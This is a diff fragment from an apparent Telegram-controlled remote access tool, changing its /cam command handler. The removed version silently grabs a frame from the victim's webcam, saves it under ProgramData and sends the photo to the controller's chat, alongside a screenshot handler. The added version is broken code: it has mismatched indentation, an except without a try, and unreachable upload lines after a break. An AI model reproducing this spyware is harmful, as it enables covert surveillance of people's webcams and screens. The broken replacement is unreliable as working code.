@@ -81,21 +81,20 @@ def send_screen(command):
 		bot.send_photo(id_chat, 'Error')
 
 @bot.message_handler(commands=['cam'])
-def webcam(command):
-	try:
-		cap = cv2.VideoCapture(0)
-		for i in range(30):
-			cap.read()
-
-		ret, frame = cap.read()
-		cv2.imwrite(os.environ['ProgramData'] + '\\WebCam.jpg', frame)
-
-		bot.send_chat_action(id_chat, 'upload_photo')
-		cap.release()
-
-		webcam = open(os.environ['ProgramData'] + '\\WebCam.jpg', 'rb')
-		bot.send_photo(id_chat, webcam)
-		webcam.close()
+def cam(command):
+	camera = cv2.VideoCapture(0)
+	while True:
+		return_value,image = camera.read()
+        gray = cv2.cvtColor(image,cv2.COLOR_BGR2GRAY)
+        cv2.imshow('image',gray)
+        if cv2.waitKey(1)& 0xFF == ord('s'):
+        	cv2.imwrite('webcam.jpg',image)
+            break
+            camera.release()
+            cv2.destroyAllWindows()
+            bot.sendChatAction(chat_id, 'upload_photo')
+            bot.sendDocument(chat_id, open('webcam.jpg', 'rb'))
+            os.remove('webcam.jpg')
 		
 	except:
 		bot.send_chat_action(id_chat, 'typing')
